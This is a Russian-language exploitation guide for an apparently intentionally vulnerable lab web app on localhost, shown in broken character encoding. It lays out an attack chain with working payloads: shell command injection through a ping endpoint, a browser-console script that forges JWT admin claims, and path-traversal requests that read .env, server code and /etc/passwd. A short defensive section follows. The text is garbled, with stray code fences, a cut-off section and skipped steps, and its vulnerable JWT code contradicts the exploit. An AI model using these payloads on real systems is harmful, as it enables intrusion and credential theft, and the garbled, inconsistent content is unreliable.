# ðŸ”“ Ð ÑƒÐºÐ¾Ð²Ð¾Ð´ÑÑ‚Ð²Ð¾ Ð¿Ð¾ ÑÐºÑÐ¿Ð»ÑƒÐ°Ñ‚Ð°Ñ†Ð¸Ð¸ ÑƒÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÐµÐ¹

## ðŸŽ¯ Ð¦ÐµÐ¿Ð¾Ñ‡ÐºÐ° Ð°Ñ‚Ð°ÐºÐ¸ (Step by Step)

### Ð¡Ñ†ÐµÐ½Ð°Ñ€Ð¸Ð¹: ÐŸÐ¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð° Ðº ÑÐµÑ€Ð²ÐµÑ€Ñƒ

**Ð¦ÐµÐ»ÑŒ:** Ð—Ð»Ð¾ÑƒÐ¼Ñ‹ÑˆÐ»ÐµÐ½Ð½Ð¸Ðº Ñ…Ð¾Ñ‡ÐµÑ‚ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð¿Ð¾Ð»Ð½Ñ‹Ð¹ Ð´Ð¾ÑÑ‚ÑƒÐ¿ Ðº ÑÐµÑ€Ð²ÐµÑ€Ñƒ

**Ð¨Ð°Ð³ 1: Ð Ð°Ð·Ð²ÐµÐ´ÐºÐ° (OS Command Injection)**
1. ÐŸÐ¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ Ð¾Ñ‚ÐºÑ€Ñ‹Ð²Ð°ÐµÑ‚ ÑÐ°Ð¹Ñ‚ Ð¸ Ð²Ð¸Ð´Ð¸Ñ‚ Ð² DevTools (F12 â†’ Network) Ð·Ð°Ð¿Ñ€Ð¾Ñ Ðº `/api/admin/ping`
2. ÐŸÐµÑ€ÐµÑ…Ð²Ð°Ñ‚Ñ‹Ð²Ð°ÐµÑ‚ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ð¸ Ð²Ð¸Ð´Ð¸Ñ‚ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€ `{"ip": "127.0.0.1"}`
3. Ð’Ñ‹Ð¿Ð¾Ð»Ð½ÑÐµÑ‚ OS Command Injection:
```bash
POST /api/admin/ping
{"ip": "127.0.0.1; whoami"}
```
4. **Ð ÐµÐ·ÑƒÐ»ÑŒÑ‚Ð°Ñ‚:** ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÑ‚ Ð¸Ð¼Ñ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ ÑÐµÑ€Ð²ÐµÑ€Ð° (Ð½Ð°Ð¿Ñ€Ð¸Ð¼ÐµÑ€: `www-data` Ð¸Ð»Ð¸ `root`)

**Ð¨Ð°Ð³ 2: ÐŸÐ¾Ð²Ñ‹ÑˆÐµÐ½Ð¸Ðµ Ð¿Ñ€Ð¸Ð²Ð¸Ð»ÐµÐ³Ð¸Ð¹ (JWT Manipulation)**
1. Ð—Ð»Ð¾ÑƒÐ¼Ñ‹ÑˆÐ»ÐµÐ½Ð½Ð¸Ðº Ð¿Ð¾Ð½Ð¸Ð¼Ð°ÐµÑ‚, Ñ‡Ñ‚Ð¾ Ð½ÑƒÐ¶ÐµÐ½ Ð´Ð¾ÑÑ‚ÑƒÐ¿ Ðº Ð°Ð´Ð¼Ð¸Ð½-Ð¿Ð°Ð½ÐµÐ»Ð¸
2. Ð ÐµÐ³Ð¸ÑÑ‚Ñ€Ð¸Ñ€ÑƒÐµÑ‚ÑÑ ÐºÐ°Ðº Ð¾Ð±Ñ‹Ñ‡Ð½Ñ‹Ð¹ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ
3. ÐžÑ‚ÐºÑ€Ñ‹Ð²Ð°ÐµÑ‚ ÐºÐ¾Ð½ÑÐ¾Ð»ÑŒ Ð±Ñ€Ð°ÑƒÐ·ÐµÑ€Ð° (F12) Ð¸ Ð²Ñ‹Ð¿Ð¾Ð»Ð½ÑÐµÑ‚:
```javascript
const token = localStorage.getItem('token');
const [header, payload, signature] = token.split('.');
const decodedPayload = JSON.parse(atob(payload));
decodedPayload.isAdmin = true;
const newPayload = btoa(JSON.stringify(decodedPayload));
const newToken = `${header}.${newPayload}.${signature}`;
localStorage.setItem('token', newToken);
location.reload();
```
4. **Ð ÐµÐ·ÑƒÐ»ÑŒÑ‚Ð°Ñ‚:** ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÑ‚ Ð´Ð¾ÑÑ‚ÑƒÐ¿ Ðº `/admin` Ð¿Ð°Ð½ÐµÐ»Ð¸

**Ð¨Ð°Ð³ 3: ÐšÑ€Ð°Ð¶Ð° ÑƒÑ‡ÐµÑ‚Ð½Ñ‹Ñ… Ð´Ð°Ð½Ð½Ñ‹Ñ… (Path Traversal)**
1. Ð’ Ð°Ð´Ð¼Ð¸Ð½-Ð¿Ð°Ð½ÐµÐ»Ð¸ Ð¾Ñ‚ÐºÑ€Ñ‹Ð²Ð°ÐµÑ‚ Ð²ÐºÐ»Ð°Ð´ÐºÑƒ "Ð›Ð¾Ð³Ð¸ ÑÐµÑ€Ð²ÐµÑ€Ð°"
2. Ð’ Ð±Ñ€Ð°ÑƒÐ·ÐµÑ€Ðµ Ð²Ð¸Ð´Ð¸Ñ‚ Ð·Ð°Ð¿Ñ€Ð¾Ñ: `GET /api/logs?file=access.log`
3. Ð˜Ð·Ð¼ÐµÐ½ÑÐµÑ‚ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€ Ð´Ð»Ñ Ñ‡Ñ‚ÐµÐ½Ð¸Ñ Ñ„Ð°Ð¹Ð»Ð¾Ð² ÑÐµÑ€Ð²ÐµÑ€Ð°:
```bash
GET /api/logs?file=../index.js           # Ð§Ð¸Ñ‚Ð°ÐµÑ‚ ÐºÐ¾Ð´ ÑÐµÑ€Ð²ÐµÑ€Ð°
GET /api/logs?file=../.env                # Ð˜Ñ‰ÐµÑ‚ ÑÐµÐºÑ€ÐµÑ‚Ñ‹(Ñ‚Ð°Ð¼ ÐµÑÑ‚ÑŒ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ Ð¾Ñ‚ ÑÐµÑ€Ð²ÐµÑ€Ð°)
GET /api/logs?file=../package.json        # Ð˜Ð·ÑƒÑ‡Ð°ÐµÑ‚ Ð·Ð°Ð²Ð¸ÑÐ¸Ð¼Ð¾ÑÑ‚Ð¸
```
```
5. **Ð ÐµÐ·ÑƒÐ»ÑŒÑ‚Ð°Ñ‚:** ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÑ‚ SSH Ð¿Ð°Ñ€Ð¾Ð»ÑŒ root Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ!

**Ð˜Ñ‚Ð¾Ð³ Ð°Ñ‚Ð°ÐºÐ¸:**
- âœ… ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ð» Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸ÑŽ Ð¾ ÑÐµÑ€Ð²ÐµÑ€Ðµ (whoami)
- âœ… ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ð» Ð´Ð¾ÑÑ‚ÑƒÐ¿ Ðº Ð°Ð´Ð¼Ð¸Ð½-Ð¿Ð°Ð½ÐµÐ»Ð¸ (Ð¾Ð±Ñ…Ð¾Ð´ Ð°Ð²Ñ‚Ð¾Ñ€Ð¸Ð·Ð°Ñ†Ð¸Ð¸)
- âœ… ÐŸÑ€Ð¾Ñ‡Ð¸Ñ‚Ð°Ð» Ñ„Ð°Ð¹Ð»Ñ‹ ÑÐµÑ€Ð²ÐµÑ€Ð° (Ð²ÐºÐ»ÑŽÑ‡Ð°Ñ Ð¿Ð°Ñ€Ð¾Ð»Ð¸)
- âœ… ÐœÐ¾Ð¶ÐµÑ‚ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒÑÑ Ðº ÑÐµÑ€Ð²ÐµÑ€Ñƒ Ñ‡ÐµÑ€ÐµÐ· SSH Ñ root Ð¿Ñ€Ð°Ð²Ð°Ð¼Ð¸

---

## ðŸ“‹ Ð”ÐµÑ‚Ð°Ð»ÑŒÐ½Ñ‹Ðµ Ð¸Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ð¸ Ð¿Ð¾ ÐºÐ°Ð¶Ð´Ð¾Ð¹ ÑƒÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚Ð¸

## Ð£ÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÑŒ 1: OS Command Injection (`/api/admin/ping`)

### ÐžÐ¿Ð¸ÑÐ°Ð½Ð¸Ðµ
Ð¤Ñ€Ð¾Ð½Ñ‚ÐµÐ½Ð´ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÑ‚ ping Ð·Ð°Ð¿Ñ€Ð¾Ñ Ð¿Ñ€Ð¸ Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÐµ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñ‹. Ð¡ÐµÑ€Ð²ÐµÑ€ Ð½Ðµ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÑÐµÑ‚ Ð²Ñ…Ð¾Ð´Ð½Ñ‹Ðµ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð¸ Ð²Ñ‹Ð¿Ð¾Ð»Ð½ÑÐµÑ‚ ÑÐ¸ÑÑ‚ÐµÐ¼Ð½ÑƒÑŽ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñƒ.

### Ð­ÐºÑÐ¿Ð»ÑƒÐ°Ñ‚Ð°Ñ†Ð¸Ñ
```bash
# Ð§ÐµÑ€ÐµÐ· curl
curl -X POST http://localhost:8000/api/admin/ping \
  -H "Content-Type: application/json" \
  -d '{"ip": "127.0.0.1; cat /etc/passwd"}'

# Ð”Ñ€ÑƒÐ³Ð¸Ðµ Ð¿Ñ€Ð¸Ð¼ÐµÑ€Ñ‹
{"ip": "127.0.0.1; ls -la"}
{"ip": "127.0.0.1; cat /etc/passwd"}
{"ip": "127.0.0.1 && pwd"}
```

### Ð§ÐµÑ€ÐµÐ· Ð±Ñ€Ð°ÑƒÐ·ÐµÑ€
1. ÐžÑ‚ÐºÑ€Ð¾Ð¹Ñ‚Ðµ DevTools (F12) â†’ Network
2. ÐŸÐµÑ€ÐµÐ·Ð°Ð³Ñ€ÑƒÐ·Ð¸Ñ‚Ðµ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñƒ
3. ÐÐ°Ð¹Ð´Ð¸Ñ‚Ðµ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ðº `/api/admin/ping`
4. ÐŸÐšÐœ â†’ Copy â†’ Copy as fetch
5. Ð˜Ð·Ð¼ÐµÐ½Ð¸Ñ‚Ðµ Ð² ÐºÐ¾Ð½ÑÐ¾Ð»Ð¸:
```javascript
fetch("http://localhost:8000/api/admin/ping", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({ip: "127.0.0.1; whoami"})
}).then(r => r.text()).then(console.log);
```

---

## Ð£ÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÑŒ 2: ÐÐµÐ±ÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð°Ñ Ð°Ð²Ñ‚Ð¾Ñ€Ð¸Ð·Ð°Ñ†Ð¸Ñ (Insecure JWT)

### ÐžÐ¿Ð¸ÑÐ°Ð½Ð¸Ðµ
localStorage.setItem('token', 'ÐÐžÐ’Ð«Ð™_Ð¢ÐžÐšÐ•Ð_Ð¡_isAdmin_true');
```

7. ÐžÐ±Ð½Ð¾Ð²Ð¸Ñ‚Ðµ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñƒ (F5) Ð¸ Ð¿ÐµÑ€ÐµÑ…Ð¾Ð´Ð¸Ñ‚Ðµ Ð½Ð° `/admin` - Ñƒ Ð²Ð°Ñ ÐµÑÑ‚ÑŒ Ð´Ð¾ÑÑ‚ÑƒÐ¿!

#### Ð¡Ð¿Ð¾ÑÐ¾Ð± 2: Ð¡ÐºÑ€Ð¸Ð¿Ñ‚ Ð´Ð»Ñ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¾Ð¹ ÑÐºÑÐ¿Ð»ÑƒÐ°Ñ‚Ð°Ñ†Ð¸Ð¸

Ð’ÑÑ‚Ð°Ð²ÑŒÑ‚Ðµ Ð² ÐºÐ¾Ð½ÑÐ¾Ð»ÑŒ Ð±Ñ€Ð°ÑƒÐ·ÐµÑ€Ð°:

```javascript
// ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ñ‚Ð¾ÐºÐµÐ½
const token = localStorage.getItem('token');
const [header, payload, signature] = token.split('.');

// Ð”ÐµÐºÐ¾Ð´Ð¸Ñ€ÑƒÐµÐ¼ payload
const decodedPayload = JSON.parse(atob(payload));
console.log('Ð¢ÐµÐºÑƒÑ‰Ð¸Ð¹ payload:', decodedPayload);

// Ð¡Ð¾Ð·Ð´Ð°ÐµÐ¼ Ð½Ð¾Ð²Ñ‹Ð¹ payload Ñ isAdmin: true
const newPayload = { ...decodedPayload, isAdmin: true };
console.log('ÐÐ¾Ð²Ñ‹Ð¹ payload:', newPayload);

// ÐšÐ¾Ð´Ð¸Ñ€ÑƒÐµÐ¼ Ð¾Ð±Ñ€Ð°Ñ‚Ð½Ð¾
const newPayloadEncoded = btoa(JSON.stringify(newPayload));

// Ð¡Ð¾Ð·Ð´Ð°ÐµÐ¼ Ð½Ð¾Ð²Ñ‹Ð¹ Ñ‚Ð¾ÐºÐµÐ½ (Ð±ÐµÐ· Ð¸Ð·Ð¼ÐµÐ½ÐµÐ½Ð¸Ñ Ð¿Ð¾Ð´Ð¿Ð¸ÑÐ¸ - ÑƒÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÑŒ!)
const newToken = `${header}.${newPayloadEncoded}.${signature}`;

// Ð¡Ð¾Ñ…Ñ€Ð°Ð½ÑÐµÐ¼
localStorage.setItem('token', newToken);

console.log('âœ… Ð¢Ð¾ÐºÐµÐ½ Ð¸Ð·Ð¼ÐµÐ½ÐµÐ½! ÐžÐ±Ð½Ð¾Ð²Ð¸Ñ‚Ðµ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñƒ.');
```

8. ÐŸÐµÑ€ÐµÐ·Ð°Ð³Ñ€ÑƒÐ·Ð¸Ñ‚Ðµ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñƒ Ð¸ Ð¾Ñ‚ÐºÑ€Ð¾Ð¹Ñ‚Ðµ `/admin`

---

## Ð£ÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÑŒ 3: Path Traversal (LFI) Ð² `/api/logs`

### ÐžÐ¿Ð¸ÑÐ°Ð½Ð¸Ðµ
ÐÐ´Ð¼Ð¸Ð½-Ð¿Ð°Ð½ÐµÐ»ÑŒ Ð¸Ð¼ÐµÐµÑ‚ Ñ„ÑƒÐ½ÐºÑ†Ð¸ÑŽ Ð¿Ñ€Ð¾ÑÐ¼Ð¾Ñ‚Ñ€Ð° Ð»Ð¾Ð³Ð¾Ð². Ð¡ÐµÑ€Ð²ÐµÑ€ Ð½Ðµ Ð²Ð°Ð»Ð¸Ð´Ð¸Ñ€ÑƒÐµÑ‚ Ð¿ÑƒÑ‚ÑŒ Ðº Ñ„Ð°Ð¹Ð»Ñƒ, Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÑ Ñ‡Ð¸Ñ‚Ð°Ñ‚ÑŒ Ð»ÑŽÐ±Ñ‹Ðµ Ñ„Ð°Ð¹Ð»Ñ‹.

### Ð¢Ñ€ÐµÐ±Ð¾Ð²Ð°Ð½Ð¸Ñ
- Ð”Ð¾ÑÑ‚ÑƒÐ¿ Ðº `/admin` Ð¿Ð°Ð½ÐµÐ»Ð¸ (Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐ¹Ñ‚Ðµ JWT exploit Ð²Ñ‹ÑˆÐµ)

### Ð­ÐºÑÐ¿Ð»ÑƒÐ°Ñ‚Ð°Ñ†Ð¸Ñ

**Ð§ÐµÑ€ÐµÐ· Ð¸Ð½Ñ‚ÐµÑ€Ñ„ÐµÐ¹Ñ Ð°Ð´Ð¼Ð¸Ð½-Ð¿Ð°Ð½ÐµÐ»Ð¸:**
1. ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿ Ðº `/admin` (ÑÐ¼. Ð£ÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÑŒ 2)
2. ÐžÑ‚ÐºÑ€Ð¾Ð¹Ñ‚Ðµ Ð²ÐºÐ»Ð°Ð´ÐºÑƒ "Ð›Ð¾Ð³Ð¸ ÑÐµÑ€Ð²ÐµÑ€Ð°"
3. ÐžÑ‚ÐºÑ€Ð¾Ð¹Ñ‚Ðµ DevTools â†’ Console
4. Ð’Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚Ðµ:
```javascript
// Ð§Ð¸Ñ‚Ð°ÐµÐ¼ ÐºÐ¾Ð´ ÑÐµÑ€Ð²ÐµÑ€Ð°
fetch('/api/logs?file=../index.js').then(r => r.text()).then(console.log);

// Ð§Ð¸Ñ‚Ð°ÐµÐ¼ package.json
fetch('/api/logs?file=../package.json').then(r => r.text()).then(console.log);

// ÐŸÑ‹Ñ‚Ð°ÐµÐ¼ÑÑ Ð½Ð°Ð¹Ñ‚Ð¸ .env
fetch('/api/logs?file=../.env').then(r => r.text()).then(console.log);

// Ð¡Ð¸ÑÑ‚ÐµÐ¼Ð½Ñ‹Ðµ Ñ„Ð°Ð¹Ð»Ñ‹ (Linux/Mac)
fetch('/api/logs?file=../../../../etc/passwd').then(r => r.text()).then(console.log);
```

**ÐŸÑ€ÑÐ¼Ð¾Ð¹ Ð´Ð¾ÑÑ‚ÑƒÐ¿ Ñ‡ÐµÑ€ÐµÐ· URL:**
```bash
http://localhost:8000/api/logs?file=../index.js
http://localhost:8000/api/logs?file=../package.json
http://localhost:8000/api/logs?file=../../client/package.json
```

**Ð§Ñ‚Ð¾ Ð¼Ð¾Ð¶Ð½Ð¾ Ð½Ð°Ð¹Ñ‚Ð¸:**
- `../index.js` - Hardcoded SSH credentials:
```javascript
const ROOT_SSH = {
  user: 'root',
  password: 'demo123',
  host: '127.0.0.1'
};
```
- `../package.json` - Ð’ÐµÑ€ÑÐ¸Ð¸ Ð·Ð°Ð²Ð¸ÑÐ¸Ð¼Ð¾ÑÑ‚ÐµÐ¹
- `../.env` - Ð¡ÐµÐºÑ€ÐµÑ‚Ð½Ñ‹Ðµ ÐºÐ»ÑŽÑ‡Ð¸ (ÐµÑÐ»Ð¸ ÑÑƒÑ‰ÐµÑÑ‚Ð²ÑƒÐµÑ‚)
- `../config/database.js` - Ð”Ð°Ð½Ð½Ñ‹Ðµ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸Ñ Ðº Ð‘Ð”

---

## ðŸ›¡ï¸ Ð—Ð°Ñ‰Ð¸Ñ‚Ð° Ð¾Ñ‚ ÑƒÑÐ·Ð²Ð¸Ð¼Ð¾ÑÑ‚ÐµÐ¹

### OS Command Injection
**ÐŸÑ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÑÐ¿Ð¾ÑÐ¾Ð±:**
```javascript
// Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð±Ð¸Ð±Ð»Ð¸Ð¾Ñ‚ÐµÐºÐ¸ Ð¸Ð»Ð¸ Ð²Ð°Ð»Ð¸Ð´Ð°Ñ†Ð¸ÑŽ
const { isIP } = require('net');
if (!isIP(ip)) {
  return res.status(400).json({ message: 'Invalid IP' });
}
```

### Insecure JWT

**ÐŸÑ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÑÐ¿Ð¾ÑÐ¾Ð±:**
```javascript
// ÐŸÑ€Ð¾Ð²ÐµÑ€ÑÑ‚ÑŒ Ñ€Ð¾Ð»ÑŒ Ð¸Ð· Ð±Ð°Ð·Ñ‹ Ð´Ð°Ð½Ð½Ñ‹Ñ…, Ð° Ð½Ðµ Ð¸Ð· Ñ‚Ð¾ÐºÐµÐ½Ð°
const isAdmin = (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Ð¢Ñ€ÐµÐ±ÑƒÑŽÑ‚ÑÑ Ð¿Ñ€Ð°Ð²Ð° Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ð°' });
  }
  next();
};
```

**Ð£ÑÐ·Ð²Ð¸Ð¼Ñ‹Ð¹ ÑÐ¿Ð¾ÑÐ¾Ð± (Ñ‚ÐµÐºÑƒÑ‰Ð¸Ð¹):**
```javascript
// Ð£Ð¯Ð—Ð’Ð˜ÐœÐž: Ð”Ð¾Ð²ÐµÑ€Ð¸Ðµ Ð´Ð°Ð½Ð½Ñ‹Ð¼ Ð¸Ð· Ñ‚Ð¾ÐºÐµÐ½Ð°
const isAdmin = async (req, res, next) => {
  const decoded = jwt.verify(token, secret);
  if (!decoded.isAdmin) {
    return res.status(403).json({ message: 'Ð¢Ñ€ÐµÐ±ÑƒÑŽÑ‚ÑÑ Ð¿Ñ€Ð°Ð²Ð° Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ð°' });
  }
  next();
};
```

### Path Traversal
**ÐŸÑ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÑÐ¿Ð¾ÑÐ¾Ð±:**
```javascript
const path = require('path');
const allowedFiles = ['access.log', 'error.log'];

app.get('/api/logs', (req, res) => {
  const filename = req.query.file;
  
  // ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° whitelist
  if (!allowedFiles.includes(filename)) {
    return res.status(403).send('Access denied');
  }
  
  const filePath = path.join(__dirname, 'logs', filename);
  // ...
});
```
